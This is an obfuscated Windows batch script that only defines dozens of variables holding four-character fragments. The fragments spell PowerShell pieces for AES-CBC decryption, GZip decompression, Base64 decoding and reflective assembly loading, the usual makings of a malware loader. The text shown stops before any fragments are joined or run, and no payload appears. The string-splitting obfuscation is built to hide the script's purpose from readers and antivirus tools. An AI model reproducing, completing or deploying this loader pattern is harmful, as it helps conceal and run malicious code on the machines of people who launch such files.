@echo off
set "LmdwrRHDtH=ion."
set "uchUVzrsVP= New"
set "ZIMjIhWXuN=RB.T"
set "myRAjKuUho=.GZi"
set "aMkDaWOUYI=oint"
set "LaeCTMqKzV=A.En"
set "TxXuBzNVqy=Comp"
set "jTnSLKoavZ=;$lk"
set "lvsugsZMza=gsYZ"
set "umXRLpKKIP=a = "
set "toJfumvUHQ=ptog"
set "hicThgGpnm='[-1"
set "odRFIgtWIC=($Xz"
set "ZdWLnWRwxa=le  "
set "xUmnRNfUtK=3); "
set "aeNRQRqpAX=]::("
set "npdBmhtKNn=ach "
set "kClQxBjOiC=16] "
set "xLGKNpcsEC=stem"
set "uNMszDoNzU=PKCS"
set "hXzCqudrix=gnir"
set "FTQXRzhmAY=6esa"
set "GIulMQqPLA=();$"
set "kHZffkpHHo=iron"
set "RUfqDPbihE=i.Su"
set "MVnWOHpczm=oin "
set "inqsCIGMdC=oL'["
set "pTxurHzghw=bstr"
set "KsDoMEuXqv= = $"
set "yoobOKszXH=BC;$"
set "RCRIwCYHtL=[IO."
set "zlDTjxjPud=K = "
set "TdjHeuMrTp=:: '"
set "hlpoQsIhQG=ress"
set "hrTCKwlLeu=raph"
set "UOzapMeorb=embl"
set "ipxpxVWTYH=YtDn"
set "doaWQzXZSA=am;$"
set "MEurRxwohI=GuQr"
set "jqqKJXWaEg=]::N"
set "EWVvFaafxw=kwDC"
set "PKRdSOoJlh=lBlo"
set "sGhXQymSas=gth)"
set "DEaQFtIEkV=s75K"
set "KdEVASyboM=, (,"
set "iJgddkwXEz=($Xz"
set "vgvmKxKWfG=eMVs"
set "MzVoDqksTI=esMa"
set "FEvWBFdcTI=PxEW"
set "vcZWTlAtTn=$gCJ"
set "sbpxOOyyiw=comm"
set "oVAYCKiUyc=.-16"
set "cGdSvUTDxd=woA "
set "zUXWqLfggw=::De"
set "hwxYDcqhlC=zHhH"
